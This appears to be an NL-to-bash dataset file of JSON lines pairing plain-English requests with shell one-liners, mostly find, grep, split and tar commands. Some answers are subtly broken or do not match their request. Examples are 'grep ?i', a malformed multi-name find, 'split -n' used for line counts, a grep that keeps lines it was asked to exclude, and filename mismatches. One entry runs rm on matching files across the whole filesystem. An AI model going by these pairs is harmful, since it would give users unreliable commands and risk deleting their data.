{"input": "search for a word in all the files with the extension \"ch\" in the current folder", "answer": "find -name '*.[ch]' | xargs grep -E 'expr'"}
{"input": "search for a word in all the normal/regular files in the current folder", "answer": "find . -type f | xargs grep \"text\""}
{"input": "search for a word in all the php files in the current folder and display the count of all matching lines", "answer": "find . -name \\*.php -type f -exec grep -Hn '$test' {} \\+ | wc -l"}
{"input": "search for a word in all the php files in the current folder and display the matching lines", "answer": "find . -name \\*.php -type f -exec grep -Hn '$test' {} \\;"}
{"input": "search for a word in all the php files in the current folder and display the matching lines", "answer": "find . -name \\*.php -type f -print0 | xargs -0 -n1 grep -Hn '$test'"}
{"input": "search for a word in all the php files in the current folder and display the matching lines. PLus at the end takes multilple files as input", "answer": "find . -name \\*.php -type f -exec grep -Hn '$test' {} \\+"}
{"input": "search for a word in all the regular files in the current folder without traversing the sub directories ", "answer": "find -maxdepth 1 -type f | xargs grep -F 'example'"}
{"input": "search for a word in all the regular files in the current folder", "answer": "find -type f -print0 | xargs -r0 grep -F 'example'"}
{"input": "search for a word in all the regular/normal files in the current folder and display the filename along with the matched text", "answer": "find . -type f -exec grep -l linux {} \\;"}
{"input": "search for a word in all the regular/normal files in the entire filesystem. ( + is used to give more than one file as input to the grep command", "answer": "find / -type f -exec grep -i 'the brown dog' {} +;"}
{"input": "search for a word in all the shell scripts in the current folder and display the matched files", "answer": "find . -type f -name \"*.sh\" -exec grep -l landoflinux {} \\;"}
{"input": "search for a word in all the shell scripts in the current folder and display the matched files.(case insensitive search in grep commad)", "answer": "find . -type f -name \"*.sh\" -exec grep -il landoflinux {} \\;"}
{"input": "search for al cpp files in current folder and display distinct parent directory of these files in sorted order", "answer": "find . -name \"*.cpp\" -exec dirname {} + | sort -u"}
{"input": "search for al cpp files in current folder and replace all expect the parent directory name of these files and display it them sorted order", "answer": "find . -name '*.cpp' | sed -e 's/\\/[^/]*$//' | sort | uniq"}
{"input": "search for dbmsspool.sql file in the current folder", "answer": "find . -print|grep ?i dbmspool.sql"}
{"input": "search for directories in the folder \"test\" which end have 5 digits as their name", "answer": "find ./test -type d -name '[0-9][0-9][0-9][0-9][0-9]'"}
{"input": "search for directories in the folder \"test\" which end with 5 digits using regular expressions", "answer": "find ./test -regextype posix-egrep -type d -regex '.*/[0-9]{5}$'"}
{"input": "search for files cart4 or cart5 or cart6 in the folder junk which is in home folder and delete it", "answer": "find ~/junk  -name 'cart[4-6]' -exec rm {}  \\;"}
{"input": "search for files having python in filename", "answer": "find / -iname '*python*'"}
{"input": "search for files in current folder using name patterns", "answer": "find . -name \"S1A*1S*SAFE\""}
{"input": "search for files in current folder using regular expressions", "answer": "find ./ -regex '.*\\..*'"}
{"input": "search for files in the current folder ending with \".au\"", "answer": "find -type f -name '*.au'"}
{"input": "search for files in the current folder using name patterns", "answer": "find . -name '[mM][yY][fF][iI][lL][eE]*'"}
{"input": "search for files in the current folder which start with \"myfile\" ( case insensitive search )", "answer": "find . -iname 'MyFile*'"}
{"input": "search for files starting with memo and which belong to the user ann in the folder /work", "answer": "find /work -name 'memo*' -user ann -print"}
{"input": "search for files that are readable for everybody, have at least on write bit set but are not executable for anybody", "answer": "find . -perm -444 -perm /222 ! -perm /111"}
{"input": "search for files with the name \"temp\" in the /usr folder", "answer": "find /usr -name temp -print"}
{"input": "search for mp3 files in the folder /mp3collection which are smaller than 5MB", "answer": "find /mp3collection -name '*.mp3' -size -5000k"}
{"input": "search for multiple files in the current folder", "answer": "find . -name photoA.jpg photoB.jpg photoC.jpg"}
{"input": "search for pattern matched files in the current folder and subfolders exclude \"excluded path\"", "answer": "find ./ -type f -name \"pattern\" ! -path \"excluded path\" ! -path \"excluded path\""}
{"input": "search for regular files in the current folder which path is not  \"./.*\" and not \"./*/.*\"", "answer": "find ./ -type f -name \"*\" ! -path \"./.*\" ! -path \"./*/.*\""}
{"input": "search for soft links in current folder and display those links which are not pointed to files in current folder", "answer": "find . -type l -exec readlink -f '{}' \\; | grep -v \"^`readlink -f ${PWD}`\""}
{"input": "search for swap files (.swp files) in temp folder and remove them", "answer": "find /tmp -name '*.swp' -exec rm {} \\;"}
{"input": "search for the file \".user.log\" in a folder", "answer": "find /nfs/office -name .user.log -print"}
{"input": "search for the file \"file\" in current folder and save the output to the same file", "answer": "find -name file -fprint file"}
{"input": "search for the file \"foobar.txt\" in the folder \"/home/mywebsite\"", "answer": "find /home/mywebsite -type f -name \"foobar.txt\""}
{"input": "search for the file \"job.history\" in the folder /data/Spoolln and search for multiple patterns in the file and display the count of matched lines along with the pattern", "answer": "find /data/SpoolIn -name job.history | xargs grep -o -m 1 -h 'FAIL\\|ABOR' | sort | uniq -c"}
{"input": "search for the file \"myfile\" in the current folder and display all errors apart from permission denied error", "answer": "find . -name myfile |& grep -v 'Permission denied'"}
{"input": "search for the file \"myletter.doc\" in the home folder", "answer": "find ~ -name myletter.doc -print"}
{"input": "search for the file \"process.txt\" in the current folder (case insensitive search)", "answer": "find . -iname 'process.txt' -print"}
{"input": "search for the file \"process.txt\" in the entire file system", "answer": "find / -name \"process.txt\""}
{"input": "search for the file in the entire file system which has the words \"filename\" in its name", "answer": "find / -name '*filename*'"}
{"input": "search for the file job.hostory in the folder \"/data/Spoolln\"", "answer": "find /data/SpoolIn -name job.history"}
{"input": "search for the file test2 in the current folder", "answer": "find -name test2"}
{"input": "search for the files \"foo.txt\" in the current folder and rename it to foo.xml", "answer": "find -name foo.txt -execdir rename 's/\\.txt$/.xml/' '{}' ';'"}
{"input": "search for the files in the current folder which begin with the word \"kt\" followed by a digit", "answer": "find . -name 'kt[0-9] '"}
{"input": "search for the files which contain the word start in their name excluding search in ./proc, ./sys, ./run folders", "answer": "find . -path ./proc -prune -or -path ./sys -prune -or -path ./run -prune  -or -iname '*start*' -print"}
{"input": "search for the files with the name \"temp\" and which have not been accessed in the last 7*24 hours in the /usr folder", "answer": "find /usr -name temp -atime +7 -print"}
{"input": "search for the folder .dummy and remove it from the folder \"Test folder\"", "answer": "find \"Test Folder\" -type d -name '.dummy' -delete"}
{"input": "search for the folder .dummy in the entire directory structure of \"test folder\" and remove it", "answer": "find -depth \"Test Folder\" -type d -name .dummy -exec rm -rf \\{\\} \\;"}
{"input": "search for the host \"slc02oxm.us.oracle.com\" in all the xml files in the current folder and display the files which has the matched content", "answer": "find -name '*.xml' -exec grep -l 'slc02oxm.us.oracle.com' {} \\;"}
{"input": "search for the ip \"192.168.1.5\" in all the files in /etc folder", "answer": "find /etc/ -iname \"*\" | xargs grep '192.168.1.5'"}
{"input": "search for the pattern \"tgt/etc/file1\" in the files tgt/etc/file2, tgt/etc/file3", "answer": "find . -type f -name \\* | grep tgt/etc/file1 tgt/etc/file2 tgt/etc/file3"}
{"input": "search for the pattern in all the regular/normal files in the entire file system", "answer": "find / -type f -print0 | xargs -0 grep -i pattern"}
{"input": "search for the regular/normal file \"Dateiname\" in the entire file system", "answer": "find / -type f -iname \"Dateiname\""}
{"input": "search for the regular/normal file \"foo.bar\" and force delete it", "answer": "find /home -name foo.bar -type f -exec rm -f \"{}\" ';'"}
{"input": "search for the regular/normal file \"myfile\" in the current folder excluding search in the paths of \"work\" and \"home\" sub directories", "answer": "find .  \\( -name work -o -name home \\)  -prune -o -name myfile -type f -print"}
{"input": "search for the regular/normal file 'myfile' in the folder /root excluding those that are present in the \"work\" directory", "answer": "find /root/ -name 'work' -prune -o -name myfile -type f -print"}
{"input": "search for the regular/normal file 'myfile' in the folder /root excluding those that are present in the /root/work directory", "answer": "find /root/ -path '/root/work' -prune -o -name myfile -type f -print"}
{"input": "search for the regulars file starting with HSTD which have been modified yesterday from day start and copy them to /path/tonew/dir", "answer": "find . -type f -iname 'HSTD*' -daystart -mtime 1 -exec cp {} /path/to new/dir/ \\;"}
{"input": "search for version in system.info files", "answer": "find /home/*/public_html/ -type f -iwholename \"*/modules/system/system.info\" -exec grep -H \"version = \\\"\" {} \\;"}
{"input": "search for word linux in all the regular/normal files in the folder mail", "answer": "find ~/mail -type f | xargs grep \"Linux\""}
{"input": "search normal files called ' banckup '  from /usr directory downward and print them", "answer": "find /usr -type f -name backup -print"}
{"input": "search the entire file system for the file \"jan92.rpt\"", "answer": "find / -name jan92.rpt -print"}
{"input": "search the file \"myfile.txt\" in home folder", "answer": "find \"$HOME/\" -name myfile.txt -print"}
{"input": "search the file myfile.txt in the current folder", "answer": "find . -name myfile.txt -print"}
{"input": "search the pattern ^PyErr in all the \".c\" files in the folder Lib/", "answer": "find Lib/ -name '*.c' -print0 | xargs -0 grep ^PyErr"}
{"input": "search the word \"MySearchStr\" in all the regular/normal files in the current folder and display the line number and the file name", "answer": "find . -type f -print0 | xargs -0 -e grep -nH -e MySearchStr"}
{"input": "search the word NEEDLE and substitute it with REPLACEMENT in all the php files of the current folder", "answer": "find ./ -type f -exec sed -i '' 's#NEEDLE#REPLACEMENT#' *.php {} \\;"}
{"input": "search through only the /usr and /home directories for any file named Chapter1.txt", "answer": "find /usr /home -name Chapter1.txt -type f"}
{"input": "searches through the /usr directory for the regular  file named 'Chapter1*'", "answer": "find /usr -name \"Chapter*\" -type f"}
{"input": "searches through the root filesystem (\"/\") for the file named Chapter1, and prints the location", "answer": "find / -name Chapter1 -type f"}
{"input": "searches through the root filesystem (\"/\") for the file named Chapter1", "answer": "find / -name Chapter1 -type f"}
{"input": "searching for all files with the extension mp3", "answer": "find / -name *.mp3"}
{"input": "set MyVariable to the value of VARIABLE_NAME", "answer": "myVariable=$(env  | grep VARIABLE_NAME | grep -oe '[^=]*$');"}
{"input": "set a crontab to create or update the timestamp of \"washere1\" in the current directory every minute", "answer": "echo \"* * * * * touch $(pwd)/washere1\" | crontab"}
{"input": "set a crontab to create or update the timestamp of \"washere2\" in the current directory every 30 minutes", "answer": "echo \"30 * * * * touch $(pwd)/washere2\" | crontab"}
{"input": "show a count of the number of filenames ending in .txt in the current directory, without descending into sub-directories", "answer": "find . -maxdepth 1 -name \\*.txt -print0 | grep -cz ."}
{"input": "show all .cpp, .c, .h, .hpp files in the folder ~/src", "answer": "find ~/src -type f \\( -iname '*.cpp' -or -iname '*.h' -or -iname '*.c' -or -iname '*.hpp' \\) -exec echo {} \\;"}
{"input": "show all directories in the current folder excluding those that are present in the sub directories of media, images and backups", "answer": "find . -type d \\( -name media -o -name images -o -name backups \\) -prune -o -print"}
{"input": "show all directories in the current folder excluding those that are present only in the paths ./media, ./images and ./backups", "answer": "find . -path './media' -prune -o -path './images' -prune -o -path './backups' -prune -o -print"}
{"input": "show all files in /usr/tom and display only files ending with \".pl\" or \".pm\"", "answer": "find /usr/tom | egrep '*.pl| *.pm'"}
{"input": "show all regular/normal the files in the current folder whose size is bigger than 0 bytes excluding everything", "answer": "find * -prune -type f -size +0c -print"}
{"input": "show all the \".acc\" files in the folder /home", "answer": "find /home -type f -name '*.aac'"}
{"input": "show all the \".flac\" files in the current folder and do not search in the sub directories", "answer": "find . -maxdepth 1 -type f -name '*.flac'"}
{"input": "show all the files in the current folder excluding those from the directories whose name starts with \"git\"", "answer": "find . -type d -name '.git*' -prune -o -type f -print"}
{"input": "show all the files in the current folder which has the word \"ITM\"", "answer": "find . -name '*ITM*'"}
{"input": "show all the files in the entire file system which are bigger than 1.1GB", "answer": "find / -size +1.1G"}
{"input": "show all the files in the entire file system which are bigger than 100MB", "answer": "find / -size +100M"}
{"input": "show all the regular files in current folder", "answer": "find . -type f -print0"}
{"input": "show all the regular/normal files in the folder /home/user/demo", "answer": "find /home/user/demo -type f -print"}
{"input": "show the disk use of all the regular/normal files in the current folder which are bigger than 50MB", "answer": "find . -type f -size +50000k | xargs du -sh"}
{"input": "show the disk use of all the regular/normal files in the file system which are bigger than 100MB", "answer": "find / -type f -size +100M | xargs du -sh"}
{"input": "show the list of all the files in the current folder which have been modified within the 24 hours", "answer": "find . -mtime 0 -print"}
{"input": "show the sum of disk used by all the files that belong to the user \"test1\" in the entire file system", "answer": "find / -user test1 -exec du -sm {} \\;|awk '{s+=$1}END{print s}'"}
{"input": "simulate a full login of user builder", "answer": "su -l builder"}
{"input": "sort and display the unique lines display the contents of all the files that have been modified in the last 91 days and not in the last 2 days", "answer": "find .  -name \"*.txt\" -type f -daystart -mtime -91 -mtime +2 | xargs cat | sort | uniq"}
{"input": "sort and display top 11 files along with the last access date for all the files in the file system ( sort based on the timestamp )", "answer": "find / -type f -printf \"\\n%AD %AT %p\" | head -n 11 | sort -k1.8n -k1.1nr -k1"}
{"input": "sort based on size and display top ten small normal/regular files in the current folder", "answer": "find . -type f -exec ls -s {} \\; | sort -n | head -10"}
{"input": "sort each file in the bills directory, leaving the output in that file name with .sorted appended", "answer": "find bills -type f -execdir sort -o '{}.sorted' '{}' ';'"}
{"input": "split all files in directory \"/dev/shm/split/\" into pieces per 1000 lines", "answer": "find /dev/shm/split/ -type f -exec split -l 1000 {} {} \\;"}
{"input": "split all files in directory \"posns \" into pieces per 10000 lines", "answer": "find posns -type f -exec split -l 10000 {} \\;"}
{"input": "split compressed content of the directory /home into pieces per 4000 mb named as  \"/media/DRIVENAME/BACKUPNAME.tgz.NNN\"", "answer": "tar --one-file-system -czv /home | split -b 4000m - /media/DRIVENAME/BACKUPNAME.tgz"}
{"input": "split compressed content of the file www into pieces per 1073741824 bytes named as \"backup.tar.NNN\"", "answer": "tar czf - www|split -b 1073741824 - www-backup.tar."}
{"input": "split content all files file1..40000 into pieces per 1445 lines named as outputprefixNNN as digital prefix", "answer": "cat file1 file2 ... file40000 | split -n r/1445 -d - outputprefix"}
{"input": "split content of the file file.txt started from second line into pieces per 4 lines named as split_NNN", "answer": "tail -n +2 file.txt | split -l 4 - split_"}
{"input": "split content of the file inputfile except lines started with \"^t:\" into pieces per 200 lines", "answer": "cat inputfile | grep \"^t\\:\" | split -l 200"}
{"input": "split content of the files *.txt beginning with 1001st line into pieces per 1000 lines", "answer": "cat *.txt | tail -n +1001 | split --lines=1000"}
{"input": "split file \"$file into pieces named with 5 character suffix", "answer": "split -a 5 $file"}
{"input": "split file \"${fspec} into pieces named as \"xyzzyNNN\" with numeric prefix from 1 to 6", "answer": "split --number=l/6 ${fspec} xyzzy."}
{"input": "split file /etc/gconf/schemas/gnome-terminal.schemas into pieces per 1000000 lines", "answer": "split -n 1000000 /etc/gconf/schemas/gnome-terminal.schemas"}
{"input": "split file /usr/bin/firefox into pieces per 1000 lines", "answer": "split -n 1000 /usr/bin/firefox"}
{"input": "split file /usr/bin/gcc into pieces per 100000 lines", "answer": "split -n 100000 /usr/bin/gcc"}
{"input": "split file abc.txt into pieces per 1500000000 bytes named as \"abc.NNN\"", "answer": "split --bytes=1500000000 abc.txt abc"}
{"input": "split file data.csv into pieces per 100 lines", "answer": "split -l 100 date.csv"}
{"input": "split file input.txt into pieces per 1 line named output.NNNNN", "answer": "split --lines=1 --suffix-length=5 input.txt output."}
{"input": "split file t.txt into pieces per 30000000 lines named as \"t.NN\" with numeric suffix", "answer": "split --lines=30000000 --numeric-suffixes --suffix-length=2 t.txt t"}
{"input": "split listing of the current directory into pieces per 500 lines named \"outputXYZNNN\"", "answer": "ls | split -l 500 - outputXYZ."}
{"input": "split processed content of the file inout_file into pieces per 2000000 named as \"out-prefix-NNN\"", "answer": "sed 's/\\(.....\\)\\(.....\\)/\\1\\n\\2/' input_file | split -l 2000000 - out-prefix-"}
{"input": "split processed content of the file temp into pieces per 1 line named \"tempNNN\" with numeric suffix", "answer": "sed 's/3d3d/\\n&/2g' temp | split -dl1 - temp"}
{"input": "split result of the command \"tar [your params]\" into pieces per 500 mb named as \"output_prefixNNN\"", "answer": "tar [your params] |split -b 500m - output_prefix"}
{"input": "split the file data.csv into pieces per 100 mb named as data.tsv.NNN with digital prefixes", "answer": "split -C 100m -d data.tsv data.tsv."}
{"input": "split the file hugefile.txt into pieces per 100000 lines named as partNNN with digital prefixes", "answer": "split -a4 -d -l100000 hugefile.txt part."}
{"input": "split the first 100 lines of the file \"datafile\" per lines with size 1700 bytes", "answer": "sed 100q datafile | split -C 1700 -"}
{"input": "split the result of command \"ping -c 25 google.com | tee \" into pieces per 100000 bytes named as \"/home/user/myLogFile.logNNN\"", "answer": "ping -c 25 google.com | tee >(split -d -b 100000 - /home/user/myLogFile.log)"}
{"input": "start 2 sleep processes in the background", "answer": "sleep 100 | sleep 200 &"}
{"input": "start from current directory, skip the directory src/emacs and all files and directories under it, and print the names of the other files found", "answer": "find . -wholename './src/emacs' -prune -o -print"}
{"input": "start from current directory, skip the directory src/emacs and print it then skip all files and directories under it, and print the names of the other files found", "answer": "find . -wholename './src/emacs' -prune , -print"}
{"input": "tar all files in the current folder and ask for user confirmation before creating the tar ball", "answer": "find . -ok tar rvf backup {} \\;"}
{"input": "tar all the regular java files to myfile.tar", "answer": "find . -type f -name \"*.java\" | xargs tar cvf myfile.tar"}
{"input": "test if the 2nd column in file A is in the reverse order of the second column of file B", "answer": "diff --brief <(awk '{print $2}' A) <(tac B | awk '{print $2}')"}
{"input": "this find command Substitute space with underscore in the file name replaces space in all the *.mp3 files with _", "answer": "find . -type f -iname '*.mp3' -exec rename '/ /_/'  {} \\;"}
{"input": "unsafed rm all file which name start with '#'", "answer": "find / -name '#*' -atime +7 -print | xargs rm"}
{"input": "unzip and search for a word in all the jar files in the current folder and display the matched file name", "answer": "find . -iname '*.jar' -printf \"unzip -c %p | grep -q '<stringWithOrWithoutSpacesToFind>' && echo %p\\n\" | sh"}
{"input": "update the permission of all the files in the folder /u/netinst to 500", "answer": "find /u/netinst -print | xargs chmod 500"}
{"input": "update the permission of all the php files in current directory and save the output to a file", "answer": "find . -name '*.php' -exec chmod 755 {} \\; | tee logfile.txt"}
{"input": "update the permissions of the directories in the folder folder_name to 775", "answer": "find folder_name -type d -exec chmod 775 '{}' \\;"}
{"input": "use find -exec with multiple commands", "answer": "find . -name \"*.txt\" -exec echo {} \\; -exec grep banana {} \\;"}
{"input": "use find command to search for .png and .jpg files", "answer": "find ./ -type f \\( -iname \\*.jpg -o -iname \\*.png \\)"}
{"input": "use regex with find command", "answer": "find . * | grep -P \"[a-f0-9\\-]{36}\\.jpg\""}
{"input": "using exec in find command to dispaly the searched files", "answer": "find . ... -exec cat {} \\; -exec echo \\;"}
{"input": "wait 2 seconds and then print \"hello\"", "answer": "echo \"hello `sleep 2 &`\""}
{"input": "when using vi-insert keymap bind command \"\\C-v{}\\ei\" to key \"{\"", "answer": "bind -m vi-insert '\"{\" \"\\C-v{}\\ei\"'"}